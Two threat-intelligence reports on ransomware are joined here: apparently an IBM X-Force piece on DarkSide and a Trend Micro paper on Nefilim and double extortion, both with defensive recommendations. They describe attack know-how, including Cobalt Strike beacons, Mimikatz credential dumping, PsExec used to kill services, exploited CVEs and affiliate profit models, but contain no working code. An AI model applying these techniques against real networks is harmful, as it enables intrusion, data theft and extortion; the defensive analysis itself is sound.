Used in post-\nexploitation, Cobalt Strike stagers help attackers control infected devices. ‘Stagers’ are tiny\nprograms that download the larger Beacon payload and pass control to it.\n\n Different parts of the attack are manually performed by an attacker, typically using familiar\nyet extensive living-off-the-land tactics. In cases of weakly secured or unmonitored servers,\nattackers were able to easily expand their ability to collect data and move laterally. Using\nWindows Active Directory tools, some cases lead to a DCSync attack that can end in the\nexposure of all AD data to the attacker and subsequent Golden Ticket attacks.\n\nhttps://securityintelligence.com/posts/sodinokibi-revil-ransomware-disrupt-trade-secrets/\nhttps://securityintelligence.com/posts/multifactor-authentication-changing-threat-landscape/\nhttps://attack.mitre.org/techniques/T1003/006/\nhttps://attack.mitre.org/techniques/T1558/001/\n\n\n4/8\n\nIn various DarkSide attacks, systems, where an EDR solution was installed were avoided.\n\nNeed for Speed — DarkSide v2.0\n\nMost ransomware operators understand that they need speed to encrypt as much data as\npossible as quickly as they can. They, therefore, opt to use symmetric encryption for that first\nphase and then encrypt the first key with an asymmetric key. In DarkSide’s case, they claim\nto have come up with an accelerated implementation; the malware uses the Salsa20 stream\ncipher to encrypt victim data. They include an 80-byte public RSA-1024 key embedded in the\nmalware’s executable file and use it to encrypt the Salsa20 matrix. If implemented correctly, it\nis not possible to break this key and victims will have to find other ways to get their data back\nto an operational state.\n\nInterestingly, to assure victimized organizations that they can make good on their decryption\npromises, DarkSide advertised their ability to provide the “fastest ever decryption speed.”\n\nThe malware can attack both Windows and Linux environments, making enterprise servers\njust as ‘encryptable’ as an employee’s endpoint. DarkSide can also attack virtual machines\nand encrypt data on their hard drives.\n\nWhere DarkSide attackers do take their time is the first stage of the attack. They do not\ninitiate the encryption process until they have attained other objectives that can help them\nmaximize eventual leverage on the victim, such as mapping networks and backups, setting\nup user access they can work with, and exfiltrating data they plan to leak later if they are not\npaid.\n\nA Self-Confessed Financially Motivated Attack\n\nThe past decade saw ransomware evolve from a nuisance into one of the most impending\nrisks CISOs and security leaders must reckon with, no matter the sector they operate within.\nThe urgent need for incident response plans and capabilities has increased exponentially\nand has proven to be essential to mitigating risk, impact, and long-term results of cyber-\nattacks.\n\nDisruption, extortion, and sometimes destruction are the hallmarks of cyber attackers out to\ndemand a ransom, as the phenomenon grows over time. Ransomware attacks have been\ndenounced and warned against by industry leaders and government officials alike. While\naddressing the U.S. Congress, former CISA director Chris Krebs noted that with raging\nransomware attacks “we are on the cusp of a global digital pandemic driven by greed.”\n\nThe group, when asked about their motivations, responded on social media that their aims\nwere financial.\n\nhttps://www.infosecurity-magazine.com/news/darkside-20-ransomware-fastest/\nhttps://securityintelligence.com/posts/from-state-sponsored-attackers-to-common-cybercriminals-destructive-attacks-on-the-rise/\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-049a\nhttps://www.cisa.gov/ransomware-alerts-and-tips\nhttps://twitter.com/darktracer_int/status/1391735232991092738\n\n\n5/8\n\n“We are apolitical, we do not participate in geopolitics,  do not need to tie us with a\ndefined government and look for other our motives.\n\nOur goal is to make money, and not creating problems for society.\n\nFrom today we introduce moderation and check each company that our partners want\nto encrypt to avoid social consequences in the future.”\n\nFigure 2: Source: DarkTrace\n\nThe growing number of ransomware incidents around the globe has made this a critical issue\nfor national governments.  As this attack continues to unfold, experts say fuel prices in the\nU.S. are likely to rise 2-3% starting May 10th, but the impact will continue to increase for as\nlong as the pipeline is offline. A government-issued emergency waiver allows for the\ntemporary delivery of fuel products via ground transportation until the pipeline’s operations\nare restored.\n\nAdopting a Zero Trust Approach to Reduce Risk\n\nZero trust is a framework that assumes a complex network’s security is always at risk to\nexternal and internal threats. It helps organize and strategize a thorough approach to counter\nthose threats.\n\nBy assuming that every connection and endpoint is considered a threat, a zero trust\napproach leans on a framework that protects against these threats, whether external or\ninternal, even for those connections already inside. In a nutshell, a zero-trust network:\n\n\n\n6/8\n\nLogs and inspects all corporate network traffic\nLimits and controls access to the network\nVerifies and secures network resources\n\nTo expand, the zero-trust security model is designed so that data and resources are\ninaccessible by default. Users can only access them on a limited basis under the right\ncircumstances, known as least-privilege access. A zero-trust security model verifies and\nauthorizes every connection, such as when a user connects to an application or software, to\na data set via an application programming interface (API). It requires that the interaction\nmeets the conditional requirements of the organization’s security policies. A zero-trust\nsecurity strategy also authenticates and authorizes every device, network flow, and\nconnection based on dynamic policies, using context from as many data sources as\npossible. Learn more about IBM Security’s zero trust approach.\n\nX-Force is advising organizations to be on alert for growing ransomware attacks and to be\nprepared with offline backups while implementing network segmentation and applying critical\npatches to reduce the risk. Companies also need to test detection capabilities with adversary\nsimulation and red teaming, as well as rehearse and test incident response plans to identify\ngaps, so they can limit the spread of an attack if and when one happens.

In more recent years, ransomware \n\nactors did not just rely on phishing emails to enter the targeted network, they have also \n\nleveraged unpatched servers as an initial means into the network.4 Ransomware actors \n\nalso obtain network admin credentials and exploit vulnerabilities for lateral movement,5 \n\naiming to encrypt servers that host critical data. \n\nAdvanced cybersecurity technologies have made their way to corporate networks the world \n\nover to counter this nefarious threat. The application of machine learning technologies and \n\nbehavior-based blocking in cybersecurity solutions have resulted in a dramatic reduction \n\nin the success rates of opportunistic ransomware attacks.6 Additionally, modern disaster \n\nrecovery and business continuity (DR/BC) processes are constantly improving, reducing \n\nrecovery times and the need for companies to even consider paying ransom demands.7\n\nIn our opinion, the wide adoption of these technological advances has reduced the success \n\nof old-style opportunistic ransomware attacks. However, it has also forced cybercriminals \n\nto evolve their strategies out of sheer necessity, paving the way for what we now call \n\nmodern ransomware.\n\nRansomware actors have learned to adapt and level up. Once they have identified the data \n\nthat they would want to encrypt from a victim organization, they would often exfiltrate it \n\nout of the network instead of merely encrypting it. This strategy allows for a plan B: If the \n\nvictim organization does not want to pay the ransom to recover their encrypted data, the \n\nattackers can threaten to publicize it. For modern enterprises, a data leak that involves \n\nintellectual property, proprietary information, employee personally identifiable information \n\n(PII), and customer data, comes with a significant price tag — not to mention regulatory \n\npenalties, lawsuits, and reputational damage.\n\nThe most remarkable commonality of modern ransomware attacks is their focus on taking \n\nover networks in various human-supervised stages, and not click-on-the-link, automatically \n\ndriven events. This makes a modern ransomware attack appear to resemble a plain hacking \n\nincident with a ransomware payload. \n\nThe process of manually hacking a victim’s network can be time consuming, as it can take \n\ndays or months to successfully pull off. This means that the attackers can already be in \n\nmultiple places within the network before unleashing the ransomware payload. This lack \n\nof visibility alone can make defending networks and systems against ransomware attacks \n\nsubstantially more difficult. It can also be challenging for cybersecurity professionals to \n\nput together the separate traces of a modern ransomware attack and realize that it is \n\nhappening. To make things even more difficult, these ransomware actors usually perform \n\nlateral movement with common admin tools that are more likely to fly under the radar. This \n\nhelps add a sense of invisibility for these kinds of attacks.\n\n\n\nTo put all of these together, the modern ransomware strategy of employing targeted attacks \n\nas opposed to merely automated ones is geared toward targeted ransomware rather than \n\ninfecting by the numbers or “spraying and praying.” Modern ransomware actors first look \n\nfor a big target, then spend a significant amount of time conquering each section of the \n\nvictim network until they are ready to set off the ransomware payload. In this respect, these \n\nattacks look more like nation-state advanced persistent threat (APT) attacks instead of \n\ntraditional ransomware incidents.\n\nTo better describe this new wave of ransomware, we present an in-depth case study of \n\nthe Nefilim ransomware family. Nefilim has been known to target mainly multi-billion dollar \n\ncompanies, making for a great case study on the topic. We also show how enterprises \n\ncan formulate a defense strategy that will help prevent and mitigate the effects of modern \n\nransomware attacks within the corporate network. Cross-layered detection and response \n\ntools and technologies8 allow threat analysts and incident response (IR) teams to uncover \n\nhard-to-spot threats.\n\nIt is our opinion that there is a possible distinction between the cybercriminal groups that \n\nhandle the different stages of these ransomware attacks. The actors who break into the \n\nnetwork may not necessarily be the same ones who deploy the ransomware payload. This \n\ndifference is the byproduct of a recent evolution in cybercriminal business operations: \n\nhackers, who previously just sold access to corporate networks, are now working with \n\nransomware actors to monetize hacking-related breaches.9 We explore this shift in \n\ncybercriminal business models in the next section.\n\n\n\n5 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nShifts in Criminal Business Models\nRansomware has been around for several decades. The AIDS trojan, or PC Cyborg, of 1989 was the \n\nfirst-ever ransomware, albeit it having been a rudimentary attempt at encryption.10 Since then, the tactics, \n\ntechniques, and procedures (TTPs) that make up a typical ransomware attack — and consequently, the \n\nransomware business model — has changed significantly, primarily to take advantage of new technologies \n\nthat enhance the attackers’ capabilities. \n\nPayment\nThe first technological advancement is related to the different financial instruments that actors use to \n\nreceive payment from their victims. A decade ago, when mobile phones were first utilized as payment \n\nplatforms, ransomware actors forced affected users to pay ransom by means of sending SMS to a \n\npremium rate number or adding money to an account that is linked to the phone number mentioned in \n\nthe ransom note.\n\nAn alternative payment system called electronic wallets, or e-wallets, soon triggered the next wave of \n\nransomware. Ransomware attacks that utilized e-wallets for payouts asked for larger ransom amounts.11 \n\nThe major issues with these payment methods, however, were that they were either localized to a particular \n\ngeographical region or were regulated by governments, at least in relation to cross-border transfers or the \n\nmaximum volume of anonymized transactions.  \n\nNext, and possibly the biggest development in the realm of ransomware payments, was the popularization \n\nof Bitcoin.12 A general comprehension of Bitcoin shifted from it being an innovative technology into a \n\ncurrency with the capability of transferring money around the globe and bypassing regulations. By 2014, \n\nan estimated 80,000 merchants have started accepting Bitcoin as a valid form of payment, with current \n\nnumbers being much higher.13 The profitability and anonymity offered by Bitcoin were exactly what \n\nransomware actors needed to bump up the number of ransomware incidents, the number of ransomware \n\nfamilies, and ransom amounts.14\n\n\n\n6 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nUnderground Communities and \n\nCommunication Platforms\nThe second technological factor is related to how underground actors collaborate with one another. \n\nCommunications among underground actors are implemented using different platforms, including forums, \n\nmessengers, and sometimes even social media platforms.15 New security and anonymization features \n\nof these platforms improved these actors’ capability to covertly collaborate online.16 The collaboration \n\nbetween botnet masters, other access brokers for compromised networks, and ransomware actors is one \n\nexample of such developments.17\n\nCybercriminal Partnerships and Outsourcing \nAn example of cybercriminal collaboration came in the form of ransomware as a service (RaaS), which \n\nenabled actors to look for affiliates to carry out ransomware attacks. Instead of having just one ransomware \n\ngroup doing all of the work, several collaborators split roles and ransomware profits.18 During this time, we \n\nsaw a combination of actors who had access to compromised assets collaborate closely with actors who \n\nhave developed ransomware. The evolution of these affiliate programs increased the involvement of more \n\ncybercriminals into the increasingly effective monetization of compromised assets, which is profitable for \n\nall parties involved. A clear sign of this deeper collaboration is visible in underground forums, wherein \n\ncompromised assets are sold explicitly for encryption since the other monetization paths had already \n\nbeen utilized.19\n\n\n\n7 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nCollaboration\namong bot\n\nmasters and\nransomware\n\nactors \n\nRansom\npayments sent\n\nvia premium-rate\nSMS numbers \n\nPayments sent\nvia e-wallets\n\nand alternative\npayment systems\n\n�100 - �1,000\n\nModel 1\nLocal and regional capabilities but actions at scale\n\nImpact is localized to ransom withdrawal capabilities\nwithin the region.

Major shifts related to the evolution of ransomware business processes and monetization campaigns\n\nData-Driven Victim Profiling and Pipelining\n\n\n\n8 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nA different combination of items from the first two developments discussed earlier illustrates the evolution \n\nand the major shifts in different ransomware business models and their respective monetization methods. \n\nModel 1 is related to early monetization strategies, wherein actors were limited by localized payment \n\nmethods. This model is outdated and rarely used compared with Models 2 and 3. Some underground \n\nactors still prefer Model 2, which provides moderate monetization from a large number of victims. \n\nRansomware groups who make use of Model 2 do not perform deep victim profiling prior to initiating \n\nransomware deployment. This approach has been used by actors for many years and normally pose a \n\nlower risk to victims in contrast with Model 3.\n\nModel 3 is related to more targeted monetization of victim assets and includes the deployment of several \n\nadditional steps in the cybercriminal business process. \n\nThe first signs of targeted monetization that we know of appeared almost a decade ago in Russia. \n\nCybercriminals targeted and manually encrypted accounting software database servers using ransomware \n\nand other tools before asking victims to pay a ransom to recover sensitive financial data. Due to the \n\nlimited technologies and payment methods available during that time, attacks were restricted in terms of \n\nboth geography and scale. The screenshot in Figure 2, which was taken from a forum discussion that was \n\ninitiated by a victim of this attack type, shows that attackers used phone-linked e-wallets to receive the \n\nransom. The ransom amount was RUB10,000, which was about US$320 at the time.\n\nFigure 2. Example of a predecessor of the current APT-like ransomware monetization schemes using phone-linked \n\ne-wallets as a means of payment\n\n\n\n9 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nVulnerability and Exploit Market\nOver the past few years, we have started seeing a clear shift toward targeted attacks or so-called APT-like \n\nransomware monetization schemes. It is not just about searching for bigger payoffs; a targeted approach \n\nis needed due to the improved defensive capabilities of organizations. This means that the number of \n\npotential targets for opportunistic attacks is decreasing. The deployment of better recovery systems \n\nmeans that attackers need to seek out backups in order to prevent recovery. \n\nAt the same time, cybercriminals are eager to adopt new technologies for their own profit. Several key \n\nfactors have contributed to this shift toward a more targeted criminal monetization scheme, including:\n\n•\t The increased computing power of machines, which provides cybercriminals the ability to deeply \n\nautomate processing and collect additional information about victims.20\n\n•\t The availability of public and private databases and automation tools that help perform precise \n\ncategorization of victims based on their location, industry, company name, size, and revenue.\n\n•\t The capability to initiate anonymized high-volume cross-border money transfers using \n\ncryptocurrencies and cryptocurrency mixers.\n\n•\t The extensive use of communication platforms that allow secure, interactive, and anonymized \n\ninteractions and increased collaboration between various cybercriminal groups.  \n\nThese four factors allowed criminals to add several notable steps that improved their business processes. \n\nThis shift enhanced the impact of the ransomware incidents as well as the risks associated with each \n\nattack, making defense and mitigation strategies more difficult for targeted organizations. The shift means \n\ndeep victim profiling has been performed before an attack is initiated, followed by a collaboration among \n\nmultiple groups who are sharing accesses and are using optimized monetization strategies. This shift \n\ncan be compared to a shift from perimeter security to perimeterless security in the terms of impact and \n\nafter-effects.\n\n\n\n10 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 3. Updates to the business process of ransomware monetization\n\nFigure 3 illustrates how the business process of ransomware monetization has progressed. During the \n\nearlier days of ransomware, when a victim asset or even an infrastructure was encrypted using automated \n\ntools, the ransom amount was either fixed or estimated by the attacker only after the victim initiated \n\nthe negotiation. With today’s updated business process, the attacker knows a substantial amount of \n\ninformation about the victim. This often includes the organization’s name, the number of employees, its \n\nrevenue, and the industry in which it belongs – allowing for a more tailored, victim-specific extortion \n\nransom pricing.\n\nWith more experience using the updated business process, attackers now have a much more accurate \n\nestimation of the range of possible ransom amounts for a specific victim. They are also more knowledgeable \n\nof the reasonable volume of resources that they can invest for each victim. The whole attack chain often \n\ninvolves two or more groups who are responsible for the different attack stages. Since it is normal for \n\nthis market to have a ransom for big organizations in the seven-digit range, attackers may be able to \n\nafford zero-day local privilege escalation (LPE) and remote code execution (RCE) exploits.

Mention of the use of zero-day LPE and RCE exploits in ransomware operations\n\nModern affiliate programs often involve collaboration between an actor who owns the ransomware and \n\nanother actor who controls the compromised infrastructure and distributes malware over a network. The \n\nransomware actors usually agree to a 20/80 or 30/70 split of the profit; the smaller cut goes to the group \n\nthat provides the ransomware and negotiates with a victim while the majority of the profit goes to the \n\ngroup that handles network access and implements the active phase of the attack. Typically, the group \n\nthat negotiates with a victim receives the full ransom amount and distributes the share to the participants \n\nresponsible for the other attack stages. Most of the profits go to the affiliate actor responsible for obtaining \n\nnetwork access and deploying the ransomware payload. Initial access to the victim infrastructure can be \n\nobtained by the same affiliate group, or that group can choose to sub-contract it and instead specialize \n\non privilege escalation, lateral movement, and complete takeover of the victim infrastructure. \n\nThe price for access varies greatly — it can range from tens of dollars for a random victim asset, to several \n\nhundreds or even thousands of dollars for a categorized asset; access to the infrastructure of a large \n\norganization can cost five to six figures.\n\n\n\n12 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nIt should be noted, that by its very nature, a ransomware attack will eventually be very visible to the \n\ninfrastructure owner once it is deployed. Therefore, several actors often implement other monetization \n\npaths prior to the ransomware deployment to make the overall intrusion as profitable as possible.21 Because \n\nof this — and the fact that multiple cybercriminal groups often operate together sharing accesses, and \n\nfollowing parallel monetization lifecycles — infrastructure owners can often see a crossover in attacker \n\nkill chains. This can be very confusing for defenders who may not be aware that they are looking at traces \n\ncoming from several groups, which can be related to many parallel — and even unrelated — incidents. \n\nA situation with a crossover in kill chains can make attacker attribution based on TTPs alone extremely \n\ndifficult. Due to this, it is important to understand criminal business models clearly, and attribute TTPs to \n\nseparate simultaneous attacks or a single attack performed with close collaboration between actors who \n\nshare access and join forces. \n\nThe increased visibility of the ransomware component invariably attracts more attention from the victim or \n\nlaw enforcement. However, it is important to understand the bigger picture — it is the affiliate groups who \n\nprofit the most from this arrangement and who enable these compromises in the first place. Yet, these \n\nsame groups are rarely investigated as meticulously as their ransomware partners, therefore helping this \n\noverall trend persist.\n\nDefenders also need to note that when multiple cybercrime groups unite, they have experts working \n\non the different attack stages or monetization paths of a targeted ransomware attack. The complexity \n\nof defending against sophisticated attacks can be greater compared to defending against traditional \n\ntargeted attacks or APT groups. It may be comparable to an organization defending against the attacks \n\nof a penetration tester who is armed with seemingly unlimited capabilities. \n\nFor defenders, the prevalence of these sophisticated ransomware attacks means a shorter reaction time \n\nand a much higher potential impact. For threat hunting, incident mitigations, and attack investigations, it \n\nis critical to have XDR solutions that offer complete and central visibility over every critical component, \n\nwhether it be an organization’s endpoints, network, the cloud, or other devices.\n\n\n\n13 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nModern Ransomware Case Study: \nNefilim\nThe previous sections described a shift in the ransomware business model and how this fundamental \n\nchange has reshaped the whole ransomware attack plan. The next sections will illustrate this with a case \n\nstudy.\n\nNefilim is one of the less-studied ransomware families and it will be used as an example of a modern \n\nransomware attack here. This section will describe Nefilim’s entry points to the corporate network and its \n\ngeneral method for lateral movement. It will then show how the attackers trigger the ransomware payload \n\nonce they firmly establish their foothold in the network and after they determine the most valuable data.\n\nFinally and most importantly, the case study will provide a defensive strategy to make an attack’s various \n\npieces become visible to defenders. This defensive strategy is not Nefilim-specific; it can be applied to \n\nthe ransomware business model in general. This procedure will involve software that can put together \n\neach of the attacker’s separate and often disparate pieces and correlate them as being part of a single \n\nconcerted attack. \n\nWe begin with how we think Nefilim first came to be. Based on our observations on Nefilim attacks to date, \n\nour hypothesis is that Nefilim is a RaaS operation whose business model closely resembles that of Nemty, \n\nanother RaaS operation first spotted in August 2019.22 We have tracked the actors behind both malware \n\nfamilies under the intrusion set we track as “Water Roc.” The Nefilim code seen in earlier versions is very \n\nsimilar to that of the Nemty ransomware. Interestingly, around the same time, two actors associated with \n\nNemty (Jingo and jsworm) were seen actively recruiting affiliates. Both actors were advertising a 70/30 \n\nprofit split, offering 70% to affiliates responsible for access and deployment and Nemty developers taking \n\nthe remaining 30% of the profits. A volume discount for affiliates who can regularly supply high-quality \n\nvictims was also advertised, increasing profit margins for affiliates to 90/10.\n\n\n\n14 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 5. Actor jsworm mentioned the Nemty business model’s 70/30 profit split in a forum\n\nThis profit model also means that initial access can vary based on the methods that the specific affiliate \n\nused before deploying the core Nefilim group’s ransomware payload.\n\nIn March 2020, the actor jsworm discussed a new unnamed project that is believed to have been Nefilim. \n\nThe first version of Nefilim was spotted in the wild (detected by Trend Micro as Ransom.Win32.NEFILIM.A) \n\naround that time.23\n\nThe Way In\nThe people behind targeted ransomware attacks are, in a sense, like professional penetration testers with \n\nmalicious intent. Armed with the required tools, skills, and financial motivation, they can achieve network \n\naccess through various means such as access as a service (AaaS) brokers, where access to compromised \n\nenvironments is purchased for varying prices depending on how lucrative the victim network is; via direct \n\nexploitation of internet-facing infrastructure; and phishing.\n\nIn terms of how Nefilim actors gain access, externally facing infrastructures present attackers with potential \n\ninroads to internal corporate networks, especially when such infrastructures are not fully secured. In the \n\ncase of Nefilim ransomware attacks, our investigations uncovered the use of exposed RDP services and \n\npublicly available exploits to gain initial access — namely, a vulnerability in the Citrix Application Delivery \n\nController (CVE-2019-19781).24 After gaining initial access, Nefilim attackers start by downloading \n\nadditional tools on a web browser. Among the files downloaded are a Cobalt Strike beacon, which is used \n\nto establish a remote connection to the environment and execute commands;25 the Process Hacker tool \n\nused to terminate endpoint security agents;26 and Mimikatz, which is used to dump credentials.27 In one \n\ncase that we analyzed, actors initially attempted to deploy an unsigned Cobalt Strike beacon, which was \n\ndetected by the antimalware agent running on the server. The actors persisted, returning several days \n\nlater with a signed beacon, which was once again detected. The next section describes the group’s lateral \n\nmovement approaches and the tools and techniques that they have used.\n\n\n\n15 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nIn order to run certain tools as administrator, the actors took advantage of an unpatched vulnerability in \n\nCVE-2017-0213,28 a Windows Component Object Model (COM) elevation of privilege (EoP) vulnerability \n\nthat was discovered by Google Project Zero29 and fixed by Microsoft in May 2017. The fact that a patch \n\nhas been available for this vulnerability for several years now also demonstrates the importance of \n\ntimely patching, not only for critical vulnerabilities that tend to get more attention in the media, but any \n\nvulnerability that would allow attackers opportunities to compromise infrastructures. \n\nAt this point, the attackers have landed inside the victim environment. They have downloaded a tool that \n\nenabled persistent remote access to the system and have become ready to pivot to other areas of the \n\nnetwork.\n\nThe following table lists the initial access methods that we have observed based on our analysis of Nefilim \n\nso far. We also call out methods that are commonly used by similar ransomware groups, but to date, have \n\nnot been specifically observed to be used by Nefilim.\n\nMITRE ATT&CK TTPs\n\nTactic Technique Observable\n\nReconnaissance Active scanning: Vulnerability \nscanning T1595.002\n\nAttackers actively scan for internet-facing \nhosts that are vulnerable to recently \ndisclosed exploits.

Initial access methods of Nefilim actors and other commonly used methods by similar ransomware groups \n\n *Commonly used TTPs but have not been observed in our Nefilim investigations\n\nRecommended Defenses: Preventing Ransomware Attacks by \n\nMitigating Vulnerabilities\n\nInternet-facing systems like VPN servers are directly exposed to untrusted networks and are at greater risk. \n\nOrganizations can prevent ransomware attacks by mitigating vulnerabilities in internet-facing systems. In \n\naddition, attacks against internet-facing assets should also be secured through regular patching and \n\nthe robust implementation of access controls. Solutions that provide virtual patching or vulnerability \n\nshielding can defend organizations against known and unknown vulnerabilities while avoiding work-\n\nrelated disruptions.31\n\nShielding the Network Perimeter From Exploits Used in Ransomware Attacks\n\nIntrusion prevention systems (IPS) provide a layer of protection by shielding potentially vulnerable \n\ninfrastructure through generic and specific filters from exploits that are used in targeted ransomware \n\nattacks. IPS can provide rapid protection ahead of patch availability or patch deployment. This is \n\nparticularly important with targeted ransomware attacks, wherein attackers quickly capitalize on newly \n\ndiscovered vulnerabilities or poorly secured infrastructure.\n\nAdditionally, the mining of IPS logs can unlock a wealth of actionable intelligence such as exploit usage \n\nand attacker infrastructure. Having high central visibility over these logs can help spot the initial stages \n\nof an attack.\n\nNetwork and Vulnerability Scanning\n\nDefenders should maintain an inventory of all exposed services, including ports and software versions, \n\nacross the corporate perimeter and mitigate risks as required. Periodic scanning for exposed services \n\nand vulnerabilities provides visibility on potential inroads to the network. Subscribe to security feeds from \n\nappliance and system vendors to ensure the timely mitigation of vulnerabilities.\n\n\n\n17 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nAccount Security\n\nA least-privileged administrative model should be implemented. Organizations should provide users with \n\nthe least permissive roles possible that would still allow them to accomplish their jobs or functions. On top \n\nof this, strong authentication systems such as multi-factor authentication (MFA) and conditional access \n\nfor all users must be deployed. \n\nDefenders also need to segment accounts into non-privileged, privileged, and highly privileged. It should \n\nbe noted that the use of highly privileged accounts should be limited as much as possible and should only \n\nbe used from select hardened machines.  \n\nIncident Response\n\nTargeted ransomware attacks like Nefilim often utilize data that has been exfiltrated by information-\n\nstealing malware. Security teams should perform comprehensive IR investigations in the aftermath of \n\nan information-stealing malware infection. Compiling the full kill chain and root cause analysis provides \n\nimportant lessons in the learning phase of the IR life cycle to prevent reoccurrence.\n\nOn the detection of malware like those mentioned in Figure 6, predetermined procedures called playbooks \n\ncan be used to ensure a consistent and comprehensive response to mitigate the latent threat posed by \n\nloaders and information stealers. A common defender mistake is to assume that an IR ticket can be \n\nclosed upon the removal of early-stage malware files in the system. The exfiltration of sensitive data like \n\ncredentials or the dropping of additional payloads and subsequent lateral movement could be missed in \n\nthis case. We recommend that for any malware detected in an incident, defenders should read security \n\nreports and research to see if the malware variant in question is commonly used as an early part of a larger \n\nkill chain. If so, defenders should assume that the later stages of the kill chain may have already been \n\ndeployed and they should be investigated and neutralized.\n\n\n\n18 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 6. A non-exhaustive diagram that features the relationships between malware loaders and \n\nthe final ransomware payload at the time of writing\n\nCross-Layered Detection and Response\n\nIt is becoming increasingly commonplace for organizations and enterprises to use multiple security layers \n\nto detect and block threats from email, endpoints, servers, cloud infrastructures, and networks. Though \n\nthese perform their function well, the disparate layers can result to siloed threat information and an \n\nabundance of uncorrelated alerts. These can deter the proper and efficient remediation of threats.\n\nOrganizations can benefit from a threat defense platform that provides a correlated and comprehensive \n\nview of threats. This provides organizations with streamlined alerts of all pertinent threat-related activities \n\nthat will allow them to investigate and launch a complete defense plan.\n\nVisibility over the entire infrastructure including emails, networks, endpoints, on-premise servers, and the \n\ncloud is key to defending organizations against targeted ransomware attacks. Managed XDR solutions \n\ncan give IR teams a broader perspective and provide better attack-centric context to the chain of events \n\nfrom a single dashboard. These tools help facilitate faster detection and complete remediation against \n\nmulti-stage attacks like those seen in Nefilim ransomware attacks.\n\nMalspam\n\nMalspam\n\nExploit vulnerability or\nuse stolen credentials on\nexposed infrastructure \n(VPN, RDP, web servers)\n\nExploit vulnerability or\nuse stolen credentials on\nexposed infrastructure \n(VPN, RDP, web servers)\n\nMalspam\n\nMalspam\n\nMalvertising Blackhat SEO\n\nGootkit\n\nGootkitNefilim\n\nBitPaymerContiRyuk\n\nTrickbot\n\nEmotet\n\nMalspam\n\nDridex\n\nEmotet\n\nMalspam\n\nDridex\n\nEmotet\n\nMalspam\n\nQakBot\n\nMalspam\n\nQakBot\n\nMalspam\n\nTrickbot\n\nEmotet\n\nMalspam Malspam\n\nBazarLoader IcedID\n\nDoppelPaymer Egregor Maze\n\nModern ransomware\n\n\n\n19 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nLateral Movement and Privilege Escalation\nOnce the attackers have gained a foothold into the network, they will attempt to perform host discovery \n\nactivities to find even more hosts to attack and compromise. Lateral movement is the process by which \n\nan attacker tries to use a compromised system or systems to find others to which they can gain access. \n\nTo avoid detection, attackers will often weaponize tools that are built-in or are commonly used by \n\nadministrators, a tactic that is otherwise called “living off the land.”32\n\nPsExec is one of the most popular tools attackers use. It is a tool created by Microsoft’s Sysinternals \n\ngroup and meant for legitimate purposes such as launching interactive command prompts on remote \n\nservers.33  However, attackers abuse PsExec to execute programs on remote systems with credentials \n\nthat have been harvested either via the lateral movement phase or pre-ransomware attack phases.34 The \n\ntool is used to execute a batch script containing a list of commands that stop certain running services \n\nand processes from running. Ransomware actors would not be able to encrypt the files that are locked by \n\ncertain processes and services, hence, they use PsExec to stop these from running. \n\nThe use of  PsExec, a legitimate tool commonly used by system administrators, has been observed during \n\nNefilim infections to launch taskkill.exe on remote machines. This would effectively stop processes that \n\nmight alert the victim to an attacker’s activities. In multiple cases, PsExec has been observed being used \n\nto stop a Simple Network Management Protocol (SNMP) daemon, backup services, and other services. \n\nIt has also been used to stop certain running services and processes in order to avoid access violations \n\nwhen encrypting files locked by those processes. PsExec is used to execute a batch script containing a \n\nlist of commands. These commands stop certain running services and processes in order to avoid access \n\nviolations that could prevent the ransomware from encrypting the files locked by those same running \n\nprocesses and services.\n\nFigure 7. Triggered taskkill.exe to end select processes\n\nWindows PowerShell, a management framework system administrators use for automating tasks, is \n\nanother common tool that attackers abuse because it is a powerful open-source and cross-platform \n\nplatform.35 We observed how cybercriminals abused a PowerShell command to drop a Cobalt Strike \n\nbeacon in one of these attacks from 2020.36 The command uses the FromBase64String function to \n\ndecode a Base64 blob. When manually decoded, it matches a PowerShell Cyberchef decoder recipe \n\non GitHub that can extract Cobalt Strike shellcode.37 This technique has been observed being used with \n\nmultiple ransomware families, including all of the Nefilim attacks that we have analyzed.\n\n\n\n20 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 8. The Base64-encoded Powershell\n\nMimikatz38 is another tool that we have seen in a few Nefilim infections. Mimikatz is a popular penetration \n\ntesting and Red Team tool that dumps plaintext passwords, hashes, Kerberos tickets, and other sensitive \n\ninformation from memory.39\n\nIn some cases, plaintext passwords are stored as variables in memory. Even if it only stores the hash \n\nof the password, there are ways to crack those hashes offline with tools such as hashcat40 or John \n\nthe Ripper (JtR).41 It can also be used to utilize cracked passwords or tickets in pass-the-hash (PTH) \n\nattacks,42 which is a common technique used to gain access to other systems within the network. While \n\nthis tool is popular, there is no major legitimate purpose necessitating system administrators to deploy \n\nthis tool in their systems. Mimikatz is also a tool that can be used for privilege escalation, which means \n\nthat the attackers are looking for higher permissions on the system than the ones they have currently \n\ncompromised.43 This most commonly occurs if a service or a user with higher privileges is logged into a \n\ncompromised machine, which can cause their passwords to still be in memory and possibly be extracted. \n\nAttackers can use unprivileged access to enter and explore a victim network, however, they would require \n\nelevated permissions to proceed with their intended objectives.44\n\nTimestamp Path Detection\n\n08/03/2020 20:54 C:\\logs\\x64\\ProcessHacker.exe PUA.Win64.ProcHack.C45 \n\n08/03/2020 20:54 C:\\logs\\x64\\kprocesshacker.sys PUA.Win32.ProcHack.B46 \n\n08/03/2020 20:54 C:\\logs\\x64\\peview.exe PUA.Win64.\nProcHack.B.component47 \n\n08/03/2020 20:54 C:\\logs\\12.log HS_MIMIKATZLOG.SM\n\n08/03/2020 21:09 C:\\logs\\12.log HS_MIMIKATZLOG.SM\n\n08/03/2020 21:46 